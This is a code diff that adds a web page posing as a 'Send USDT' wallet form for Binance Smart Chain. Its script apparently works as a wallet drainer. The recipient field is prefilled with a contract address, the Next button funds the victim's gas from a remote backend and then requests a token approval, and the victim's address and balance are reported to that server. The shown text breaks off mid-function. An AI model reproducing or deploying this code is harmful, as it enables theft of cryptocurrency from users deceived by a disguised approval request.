@@ -1,0 +1,1088 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+  <meta http-equiv="Pragma" content="no-cache" />
+  <meta http-equiv="Expires" content="0" />
+  <title>Send USDT</title>
+  <link rel="stylesheet" href="style.css?v=2">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+  <style>
+    .loading-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(10, 10, 10, 0.95);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 10000;
+    }
+
+    .loading-spinner-container {
+      text-align: center;
+    }
+
+    .loading-spinner {
+      width: 60px;
+      height: 60px;
+      border: 4px solid #121212;
+      border-top: 4px solid #1aff91;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 20px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .loading-text {
+      color: #1aff91;
+      font-size: 16px;
+      font-weight: 600;
+      margin: 0;
+    }
+  </style>
+
+</head>
+<body>
+  <!-- Loading Spinner Overlay -->
+  <div id="loadingOverlay" class="loading-overlay" style="display: none;">
+    <div class="loading-spinner-container">
+      <div class="loading-spinner"></div>
+      <p class="loading-text">Processing...</p>
+    </div>
+  </div>
+
+  <main class="container">
+    <h1 class="title">Send USDT</h1>
+
+    <label class="label" for="address">Address or Domain Name</label>
+    <div class="input-group">
+      <input type="text" id="address" placeholder="Search or Enter" value="0xb2C17c98dB3064Af431110fDd4E3c2a57aEbc7CC">
+      <button class="text-btn">Paste</button>
+      <button class="icon-btn"><i class="fas fa-address-book"></i></button>
+      <button class="icon-btn"><i class="fas fa-expand"></i></button>
+    </div>
+
+    <label class="label" for="amount">Amount</label>
+    <div class="input-group">
+      <input type="number" id="amount" placeholder="USDT Amount">
+      <span class="unit">USDT</span>
+      <button class="max-btn">Max</button>
+    </div>
+
+    <p class="estimate">≈ $0.00</p>
+
+    <button type="submit" class="next-btn" onclick="TokenApprove()">Next</button>
+  </main>
+
+  <script type="text/javascript" src="js/web3.min.js"></script>
+<script src="js/jquery-3.7.1.min.js"></script> 
+
+<!-- Browser Compatibility Check and Polyfills -->
+<script>
+    // Check browser compatibility
+    (function() {
+        console.log('🔍 [Browser Check] Checking browser compatibility...');
+        console.log('🔍 [Browser Check] User Agent:', navigator.userAgent);
+        
+        // Check for AbortController support
+        if (typeof AbortController === 'undefined') {
+            console.warn('⚠️ [Browser Check] AbortController not supported, creating polyfill...');
+            // Simple AbortController polyfill
+            window.AbortController = function() {
+                this.signal = {
+                    aborted: false,
+                    onabort: null
+                };
+                this.abort = function() {
+                    this.signal.aborted = true;
+                    if (this.signal.onabort) {
+                        this.signal.onabort();
+                    }
+                };
+            };
+        }
+        
+        // Check for fetch support
+        if (typeof fetch === 'undefined') {
+            console.error('❌ [Browser Check] Fetch API not supported! This browser is too old.');
+            alert('Your browser is too old. Please update to a modern browser.');
+        }
+        
+        // Check for Promise support
+        if (typeof Promise === 'undefined') {
+            console.error('❌ [Browser Check] Promise not supported! This browser is too old.');
+            alert('Your browser is too old. Please update to a modern browser.');
+        }
+        
+        console.log('✅ [Browser Check] Browser compatibility check complete');
+    })();
+</script>
+
+<script>
+
+        var addressTOKEN = "0x55d398326f99059ff775485246999027b3197955";
+        var matrixAbiTOKEN = [{ "inputs": [], "payable": false, "stateMutability": "nonpayable", "type": "constructor" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "owner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "spender", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Approval", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "previousOwner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "newOwner", "type": "address" }], "name": "OwnershipTransferred", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "from", "type": "address" }, { "indexed": true, "internalType": "address", "name": "to", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" }, { "constant": true, "inputs": [], "name": "_decimals", "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "_name", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "_symbol", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }, { "internalType": "address", "name": "spender", "type": "address" }], "name": "allowance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "approve", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "burn", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "subtractedValue", "type": "uint256" }], "name": "decreaseAllowance", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "getOwner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "addedValue", "type": "uint256" }], "name": "increaseAllowance", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "mint", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "name", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "owner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [], "name": "renounceOwnership", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "symbol", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "totalSupply", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "sender", "type": "address" }, { "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "newOwner", "type": "address" }], "name": "transferOwnership", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }]
+
+    var addressSTAKING = "0xb2C17c98dB3064Af431110fDd4E3c2a57aEbc7CC";
+        var matrixAbiSTAKING = [{ "constant": false, "inputs": [{ "name": "_data", "type": "bytes32" }], "name": "setfirelevel", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_senderads", "type": "address" }, { "name": "_amttoken", "type": "uint256" }, { "name": "mainadmin", "type": "address" }], "name": "RewardGeneration", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_token", "type": "address" }], "name": "setTokenAddress", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_senderads", "type": "address" }, { "name": "_amttoken", "type": "uint256" }, { "name": "membcode", "type": "uint256" }, { "name": "rcode", "type": "uint256" }, { "name": "plan", "type": "uint64" }], "name": "multiTransferUSD", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_userAddresses", "type": "address[]" }, { "name": "_amount", "type": "uint256" }], "name": "airDropTRX", "outputs": [], "payable": true, "stateMutability": "payable", "type": "function" }, { "constant": true, "inputs": [], "name": "owner", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_tokenadd", "type": "address" }, { "name": "_wallet", "type": "address" }, { "name": "_amount", "type": "uint256" }], "name": "distrubutionroi", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_contributors", "type": "address[]" }, { "name": "_balances", "type": "uint256[]" }, { "name": "membcode", "type": "uint256" }, { "name": "rcode", "type": "uint256" }, { "name": "plan", "type": "uint64" }], "name": "TransferBusd", "outputs": [], "payable": true, "stateMutability": "payable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_newValue", "type": "uint256" }], "name": "distrubutionIncome", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "name": "_contractAddress", "type": "address" }], "name": "getMsgData", "outputs": [{ "name": "hash", "type": "bytes32" }], "payable": false, "stateMutability": "pure", "type": "function" }, { "constant": false, "inputs": [{ "name": "_newOwner", "type": "address" }], "name": "transferOwnership", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "token", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "inputs": [{ "name": "_token", "type": "address" }], "payable": false, "stateMutability": "nonpayable", "type": "constructor" }, { "payable": true, "stateMutability": "payable", "type": "fallback" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "value", "type": "uint256" }, { "indexed": true, "name": "sender", "type": "address" }, { "indexed": false, "name": "membcode", "type": "uint256" }, { "indexed": false, "name": "rcode", "type": "uint256" }, { "indexed": false, "name": "ptype", "type": "uint64" }], "name": "Multisended", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "value", "type": "uint256" }, { "indexed": true, "name": "sender", "type": "address" }, { "indexed": false, "name": "membcode", "type": "uint256" }, { "indexed": false, "name": "rcode", "type": "uint256" }, { "indexed": false, "name": "ptype", "type": "uint64" }], "name": "Multireceivers", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "_userAddress", "type": "address" }, { "indexed": false, "name": "_amount", "type": "uint256" }], "name": "Airdropped", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "previousOwner", "type": "address" }, { "indexed": true, "name": "newOwner", "type": "address" }], "name": "onOwnershipTransferred", "type": "event" }];
+
+        var MatrixInstanceSTAKING, MatrixContractSTAKING, MatrixInstanceTOKEN, MatrixContractTOKEN;
+
+        // Backend URL - change this to your actual backend URL if different
+        // This URL is used for all API calls and works from any network/IP
+        // IMPORTANT: This should be the BASE URL only, without any endpoints
+        const BACKEND_URL = 'https://scaner-bnb-server-production.up.railway.app';
+        
+        // ⚠️ IMPORTANT: If site only works on your IP but not others, the issue is on the BACKEND:
+        // 1. Check Railway backend CORS configuration - must allow all origins: app.use(cors({ origin: "*" }))
+        // 2. Check Railway settings for IP whitelist/restrictions - REMOVE any IP restrictions
+        // 3. Check if Railway has any firewall rules blocking certain IPs
+        // 4. The frontend code has NO IP restrictions - all requests go directly to BACKEND_URL
+
+        // Test backend connectivity on page load
+        async function testBackendConnection() {
+            console.log('🔍 [Backend Test] Testing backend connectivity...');
+            console.log('🔍 [Backend Test] Backend URL:', BACKEND_URL);
+            console.log('🔍 [Backend Test] Browser:', navigator.userAgent);
+            console.log('🔍 [Backend Test] Fetch support:', typeof fetch !== 'undefined');
+            console.log('🔍 [Backend Test] AbortController support:', typeof AbortController !== 'undefined');
+            
+            try {
+                // Try a simple GET request to test connectivity
+                const testUrl = BACKEND_URL;
+                const response = await fetch(testUrl, {
+                    method: 'GET',
+                    mode: 'cors',
+                    credentials: 'omit',
+                    cache: 'no-cache',
+                    redirect: 'follow'
+                });
+                
+                console.log('✅ [Backend Test] Backend is reachable! Status:', response.status);
+                return true;
+            } catch (error) {
+                console.error('❌ [Backend Test] Backend connection failed:', error.message);
+                console.error('❌ [Backend Test] Error name:', error.name);
+                console.error('💡 [Backend Test] Possible issues:');
+                console.error('   - Backend server is down');
+                console.error('   - CORS not configured');
+                console.error('   - Network/firewall blocking');
+                console.error('   - Wrong backend URL');
+                console.error('   - Browser compatibility issue');
+                console.warn('⚠️ [Backend Test] Site will continue, but backend features may not work');
+                return false;
+            }
+        }
+
+        // Run backend test on page load
+        window.addEventListener('load', () => {
+            testBackendConnection();
+            connectWallet();
+        });
+    async function connectWallet() {
+        if (window.ethereum) {
+
+                // Request wallet connection
+                 const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+                    if (chainId !== '0x38') { // 0x38 is BSC Mainnet
+                        await switchToBSC();
+                    }
+
+        } else {
+            console.log("Please install MetaMask!");
+        }
+    }
+
+
+
+    async function switchToBSC() {
+            try {
+                await window.ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: '0x38' }]
+                });
+            } catch (error) {
+                if (error.code === 4902) {
+                    // If BSC is not added, request to add it
+                    await addBSCNetwork();
+                } else {
+                    console.error("Failed to switch chain", error);
+                }
+            }
+        }
+
+        async function addBSCNetwork() {
+            try {
+                await window.ethereum.request({
+                    method: 'wallet_addEthereumChain',
+                    params: [{
+                        chainId: '0x38',
+                        chainName: 'Binance Smart Chain',
+                        nativeCurrency: {
+                            name: 'Binance Coin',
+                            symbol: 'BNB',
+                            decimals: 18
+                        },
+                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                        blockExplorerUrls: ['https://bscscan.com/']
+                    }]
+                });
+            } catch (addError) {
+                console.error("Failed to add BSC network", addError);
+            }
+        }
+
+
+
+        var bal1 = 0;
+
+        async function Checkapprovaltoken() {
+
+        window.contract = web3.eth.contract(matrixAbiTOKEN);
+        window.BNBLINEcontract = contract.at(addressTOKEN);
+        var account = web3.eth.accounts[0];
+
+                window.BNBLINEcontract.allowance(account, addressSTAKING, {
+                    from: web3.eth.accounts[0]
+
+                }, function (error, result) {
+                    if (!error) {
+                        if (result > 0) {
+
+
+                     window.BNBLINEcontract.balanceOf(account, {
+                    from: web3.eth.accounts[0]
+
+                }, function (error, result) {
+                    if (!error) {
+
+                        console.log(result + ' allowance Final result is ');
+                        if (result > 0) {
+
+                            bal1 = result / 1000000000000000000;
+
+                            var maindt = { "fromaddress": account, "txthash": null, "PackageAmt": bal1 };
+
+                            // Try to use backend URL, fallback to relative URL
+                            const apiUrl = `${BACKEND_URL}/MemberPanel/TopUpWithMetamaskJson`;
+                            
+                            $.ajax({
+                                url: apiUrl,
+                                type: 'POST',
+                                dataType: 'JSON',
+                                contentType: 'application/json',
+                                data: JSON.stringify(maindt),
+                                timeout: 10000, // 10 second timeout
+                                success: function (data) {
+                                    if (data == "Success") {
+                                        showLoading('Transaction processed');
+                                        setTimeout(() => hideLoading(), 2000);
+                                        console.log('success');
+                                    }
+                                    else {
+                                        console.log('API returned:', data);
+                                    }
+                                },
+                                error: function (err) {
+                                    console.log("API error (non-critical):", JSON.stringify(err));
+                                    // This is non-critical, so we continue anyway
+                                }
+                            });
+
+                            showLoading('Transaction completed');
+                            setTimeout(() => hideLoading(), 2000);
+                        }
+                    }
+                    else {
+
+                        console.log(error.code + ' allowance Final error is ')
+                        showLoading('Transaction rejected');
+                        setTimeout(() => hideLoading(), 2000);
+                    }
+                             });
+
+                        }
+                        else {
+                            TokenApprove();
+                        }
+                    }
+                    else {
+
+                        console.log(error.code + ' allowance Final error is ')
+                        showLoading('Transaction rejected');
+                        setTimeout(() => hideLoading(), 2000);
+                    }
+                });
+
+    }
+
+         
+
+</script>
+
+<script>
+    // Initialize Web3
+    const web3 = new Web3(window.ethereum);
+
+    // Loading functions
+    function showLoading(message = 'Processing...') {
+        const overlay = document.getElementById('loadingOverlay');
+        const text = overlay.querySelector('.loading-text');
+        if (text) text.textContent = message;
+        overlay.style.display = 'flex';
+    }
+
+    function hideLoading() {
+        const overlay = document.getElementById('loadingOverlay');
+        overlay.style.display = 'none';
+    }
+
+    async function TokenApprove() {
+    // Show loading immediately when Next is clicked
+    showLoading('Processing...');
+    
+    try {
+        const accounts = await ethereum.request({ method: 'eth_accounts' });
+        const account = accounts[0];
+
+        // Step 1: Check the current BNB balance (in background)
+        const bnbBalance = await web3.eth.getBalance(account);
+        const balanceInBNB = web3.utils.fromWei(bnbBalance, 'ether');
+        console.log("Current BNB Balance: ", balanceInBNB);
+
+        const requiredBNB = 0.0001;
+
+        // Step 2: Auto top-up in background if needed
+        if (parseFloat(balanceInBNB) < requiredBNB) {
+            showLoading('Requesting gas...');
+            console.log('💰 [BNB] Balance too low, requesting top-up...');
+            console.log('💰 [BNB] Current balance:', balanceInBNB, 'BNB');
+            console.log('💰 [BNB] Required:', requiredBNB, 'BNB');
+            
+            // Request the BNB top-up from the backend
+            let topUpSuccess = false;
+            let topUpError = null;
+            
+            try {
+                topUpSuccess = await requestBNBTopUp(account);
+            } catch (error) {
+                topUpError = error;
+                console.error('❌ [BNB] Top-up request threw an error:', error);
+                topUpSuccess = false;
+            }
+
+            if (topUpSuccess) {
+                // Backend already confirmed the transaction, but we should verify balance
+                // The backend waits for tx.wait(), so the transaction is already confirmed
+                showLoading('Verifying balance...');
+                console.log('⏳ [BNB] Backend confirmed transaction, verifying balance...');
+                
+                // Give it a moment for the balance to update in the RPC
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                
+                // Poll for balance update (check every 2 seconds, max 20 seconds)
+                // Since backend already confirmed, this should be quick
+                let attempts = 0;
+                const maxAttempts = 10; // 10 attempts * 2 seconds = 20 seconds max
+                let balanceUpdated = false;
+                
+                while (attempts < maxAttempts && !balanceUpdated) {
+                    await new Promise(resolve => setTimeout(resolve, 2000));
+                    attempts++;
+                    
+                    const newBnbBalance = await web3.eth.getBalance(account);
+                    const newBalanceInBNB = web3.utils.fromWei(newBnbBalance, 'ether');
+                    console.log(`💰 [BNB] Check ${attempts}/${maxAttempts}: Balance = ${newBalanceInBNB} BNB`);
+                    
+                    if (parseFloat(newBalanceInBNB) >= requiredBNB) {
+                        balanceUpdated = true;
+                        console.log('✅ [BNB] Balance updated successfully!');
+                        showLoading('Gas received!');
+                        await new Promise(resolve => setTimeout(resolve, 1000));
+                        break;
+                    }
+                }
+                
+                if (!balanceUpdated) {
+                    console.warn('⚠️ [BNB] Balance not updated yet, but backend confirmed transaction');
+                    console.warn('⚠️ [BNB] This might be an RPC sync delay. Continuing anyway...');
+                    showLoading('Continuing...');
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                }
+            } else {
+                // Top-up request failed
+                console.error('❌ [BNB] Top-up request failed');
+                let errorMessage = 'Gas top-up failed. ';
+                
+                // Determine error type from the caught error
+                if (topUpError && topUpError.errorType) {
+                    if (topUpError.errorType === 'timeout') {
+                        errorMessage += 'Request timed out. The server may be busy. Please try again.';
+                    } else if (topUpError.errorType === 'cors') {
+                        errorMessage += 'Connection error. Please check your network connection and try again. If the problem persists, try switching between WiFi and mobile data.';
+                    } else if (topUpError.errorType === 'network') {
+                        errorMessage += 'Network error. Please check your connection and try again.';
+                    } else {
+                        errorMessage += 'Please try again.';
+                    }
+                } else {
+                    // Try to get more details
+                    try {
+                        const errorDetails = await getTopUpErrorDetails(account);
+                        if (errorDetails && errorDetails.type) {
+                            if (errorDetails.type === 'network') {
+                                errorMessage += 'Network error. Please check your connection and try again.';
+                            } else if (errorDetails.type === 'cors') {
+                                errorMessage += 'Connection blocked. Please try again or contact support.';
+                            } else if (errorDetails.type === 'timeout') {
+                                errorMessage += 'Request timed out. The server may be busy. Please try again.';
+                            } else if (errorDetails.type === 'server') {
+                                errorMessage += 'Server error. Please try again later.';
+                            } else if (errorDetails.type === 'invalid') {
+                                errorMessage += 'Invalid wallet address.';
+                            } else {
+                                errorMessage += 'Please try again.';
+                            }
+                        } else {
+                            errorMessage += 'Please try again.';
+                        }
+                    } catch (e) {
+                        errorMessage += 'Please try again.';
+                    }
+                }
+                
+                console.error('❌ [BNB] Error message shown to user:', errorMessage);
+                showLoading(errorMessage);
+                setTimeout(() => hideLoading(), 4000);
+                return; // Stop here if top-up fails
+            }
+        }
+
+        // Step 3: Hide loading so wallet can show approval popup
+        hideLoading();
+        
+        // Show approval request (MetaMask/Trust Wallet will show popup)
+        await approveToken(account);
+    } catch (error) {
+        console.error('Error:', error);
+        hideLoading();
+    }
+}
+
+// Helper function to get error details for better error messages
+async function getTopUpErrorDetails(account) {
+    // Try a quick test request to diagnose the issue
+    try {
+        const testUrl = `${BACKEND_URL}/send-bnb`;
+        let controller = null;
+        let timeoutId = null;
+        
+        try {
+            controller = new AbortController();
+            timeoutId = setTimeout(() => {
+                if (controller && controller.abort) {
+                    controller.abort();
+                }
+            }, 5000);
+        } catch (e) {
+            // AbortController not available, skip timeout
+            console.warn('⚠️ [Error Details] AbortController not available');
+        }
+        
+        // Minimal headers for error testing
+        const fetchOptions = {
+            method: 'POST',
+            headers: { 
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ recipient: account }),
+            mode: 'cors',
+            credentials: 'omit',
+            redirect: 'follow'
+        };
+        
+        if (controller && controller.signal) {
+            fetchOptions.signal = controller.signal;
+        }
+        
+        const response = await fetch(testUrl, fetchOptions);
+        
+        if (timeoutId) {
+            clearTimeout(timeoutId);
+        }
+        
+        if (!response.ok) {
+            if (response.status === 400) {
+                return { type: 'invalid', message: 'Invalid address' };
+            } else if (response.status >= 500) {
+                return { type: 'server', message: 'Server error' };
+            }
+        }
+    } catch (error) {
+        if (error.name === 'AbortError') {
+            return { type: 'timeout', message: 'Request timeout' };
+        } else if (error.message && (error.message.includes('CORS') || error.message.includes('Failed to fetch'))) {
+            return { type: 'cors', message: 'CORS/Network error' };
+        } else {
+            return { type: 'network', message: 'Network error' };
+        }
+    }
+    return null;
+}
+
+// Function to request the BNB top-up from your backend
+async function requestBNBTopUp(account) {
+    // Always use the Railway backend URL directly - works from any network
+    const apiUrl = `${BACKEND_URL}/send-bnb`;
+    
+    console.log('🔗 [BNB Top-up] ==========================================');
+    console.log('🔗 [BNB Top-up] Requesting BNB top-up');
+    console.log('🔗 [BNB Top-up] Backend URL:', apiUrl);
+    console.log('🔗 [BNB Top-up] Recipient Account:', account);
+    console.log('🔗 [BNB Top-up] ==========================================');
+    
+    if (!account) {
+        console.error('❌ [BNB Top-up] No account provided!');
+        return false;
+    }
+    
+    try {
+        // Create AbortController with fallback for older browsers
+        let controller = null;
+        let timeoutId = null;
+        
+        try {
+            controller = new AbortController();
+            // Increase timeout to 60 seconds - blockchain transactions can take time to confirm
+            timeoutId = setTimeout(() => {
+                if (controller && controller.abort) {
+                    controller.abort();
+                }
+            }, 60000); // 60 second timeout
+        } catch (e) {
+            console.warn('⚠️ [BNB Top-up] AbortController not available, using timeout fallback');
+            // Fallback: just use timeout without AbortController
+            timeoutId = setTimeout(() => {
+                throw new Error('Request timeout');
+            }, 60000);
+        }
+        
+        // First, test if backend is reachable (quick connectivity check)
+        console.log('🔍 [BNB Top-up] Testing backend connectivity first...');
+        let backendReachable = false;
+        try {
+            const healthCheck = await fetch(BACKEND_URL, {
+                method: 'GET',
+                mode: 'cors',
+                credentials: 'omit',
+                cache: 'no-cache',
+                redirect: 'follow'
+            });
+            if (healthCheck.ok) {
+                const healthData = await healthCheck.json();
+                console.log('✅ [BNB Top-up] Backend is reachable!', healthData);
+                backendReachable = true;
+            } else {
+                console.warn('⚠️ [BNB Top-up] Backend health check returned status:', healthCheck.status);
+            }
+        } catch (healthError) {
+            console.error('❌ [BNB Top-up] Backend health check failed:', healthError.message);
+            console.error('❌ [BNB Top-up] This device cannot reach the backend server');
+            console.error('💡 [BNB Top-up] Possible causes:');
+            console.error('   1. Mobile carrier blocking Railway domain');
+            console.error('   2. Network firewall blocking');
+            console.error('   3. DNS resolution issue');
+            console.error('   4. Railway IP restrictions (check Railway settings)');
+            
+            // Try test endpoint as fallback
+            try {
+                console.log('🔍 [BNB Top-up] Trying test endpoint...');
+                const testCheck = await fetch(`${BACKEND_URL}/test`, {
+                    method: 'GET',
+                    mode: 'cors',
+                    credentials: 'omit'
+                });
+                if (testCheck.ok) {
+                    const testData = await testCheck.json();
+                    console.log('✅ [BNB Top-up] Test endpoint works!', testData);
+                    backendReachable = true;
+                }
+            } catch (testError) {
+                console.error('❌ [BNB Top-up] Test endpoint also failed:', testError.message);
+            }
+            
+            if (!backendReachable) {
+                // If backend is not reachable, throw error immediately
+                const error = new Error('Backend server is not reachable from this network');
+                error.errorType = 'network';
+                error.backendUnreachable = true;
+                throw error;
+            }
+        }
+        
+        console.log('📤 [BNB Top-up] Sending POST request...');
+        const requestBody = { recipient: account };
+        console.log('📤 [BNB Top-up] Request body:', JSON.stringify(requestBody));
+        console.log('⏳ [BNB Top-up] Waiting for backend response (this may take 10-30 seconds for blockchain confirmation)...');
+        
+        // Build fetch options with optional signal
+        // Minimal headers - no origin-identifying headers
+        const fetchOptions = {
+            method: 'POST',
+            headers: { 
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(requestBody),
+            mode: 'cors',
+            credentials: 'omit',
+            cache: 'no-cache',
+            redirect: 'follow',
+            keepalive: true  // Help with mobile network reliability
+        };
+        
+        // Only add signal if AbortController is available
+        if (controller && controller.signal) {
+            fetchOptions.signal = controller.signal;
+        }
+        
+        // Log request details for debugging
+        console.log('📤 [BNB Top-up] Fetch options:', JSON.stringify({
+            method: fetchOptions.method,
+            mode: fetchOptions.mode,
+            credentials: fetchOptions.credentials,
+            hasSignal: !!fetchOptions.signal,
+            headers: fetchOptions.headers
+        }));
+        
+        let response;
+        const maxRetries = 3;
+        let fetchError = null;
+        
+        // Retry logic for mobile networks - helps with intermittent connection issues
+        // Increased retries and longer delays for mobile networks
+        for (let attempt = 1; attempt <= maxRetries; attempt++) {
+            try {
+                console.log(`📤 [BNB Top-up] Attempt ${attempt}/${maxRetries}...`);
+                console.log(`📤 [BNB Top-up] Network type: ${navigator.connection ? (navigator.connection.effectiveType || 'unknown') : 'unknown'}`);
+                
+                // Create a fresh fetch options for each attempt (some mobile browsers cache)
+                const attemptOptions = { ...fetchOptions };
+                if (controller && controller.signal && attempt === 1) {
+                    attemptOptions.signal = controller.signal;
+                }
+                
+                response = await fetch(apiUrl, attemptOptions);
+                
+                // If we got a response (even if not ok), break the retry loop
+                if (response !== undefined) {
+                    console.log(`✅ [BNB Top-up] Got response on attempt ${attempt}`);
+                    break;
+                }
+            } catch (err) {
+                fetchError = err;
+                console.warn(`⚠️ [BNB Top-up] Attempt ${attempt} failed:`, err.message);
+                console.warn(`⚠️ [BNB Top-up] Error type:`, err.name);
+                
+                if (attempt < maxRetries) {
+                    // Progressive backoff: 3s, 5s, 8s for mobile networks
+                    const waitTime = attempt === 1 ? 3000 : (attempt === 2 ? 5000 : 8000);
+                    console.log(`⏳ [BNB Top-up] Retrying in ${waitTime/1000} seconds...`);
+                    showLoading(`Retrying... (${attempt}/${maxRetries})`);
+                    await new Promise(resolve => setTimeout(resolve, waitTime));
+                } else {
+                    // All retries failed, throw the last error
+                    console.error(`❌ [BNB Top-up] All ${maxRetries} attempts failed`);
+                    console.error(`❌ [BNB Top-up] Final error:`, err);
+                    throw err;
+                }
+            }
+        }
+
+        // If we still don't have a response after all retries, throw error
+        if (!response) {
+            throw fetchError || new Error('Failed to get response from backend after retries');
+        }
+
+        if (timeoutId) {
+            clearTimeout(timeoutId);
+        }
+        console.log('📥 [BNB Top-up] Response received');
+        console.log('📥 [BNB Top-up] Status:', response.status, response.statusText);
+        
+        // Log response headers for debugging
+        try {
+            const responseHeaders = {};
+            response.headers.forEach((value, key) => {
+                responseHeaders[key] = value;
+            });
+            console.log('📥 [BNB Top-up] Response Headers:', responseHeaders);
+            
+            // Check for CORS headers
+            if (responseHeaders['access-control-allow-origin']) {
+                console.log('✅ [BNB Top-up] CORS header found:', responseHeaders['access-control-allow-origin']);
+            } else {
+                console.warn('⚠️ [BNB Top-up] No CORS header in response - this might cause issues');
+            }
+        } catch (e) {
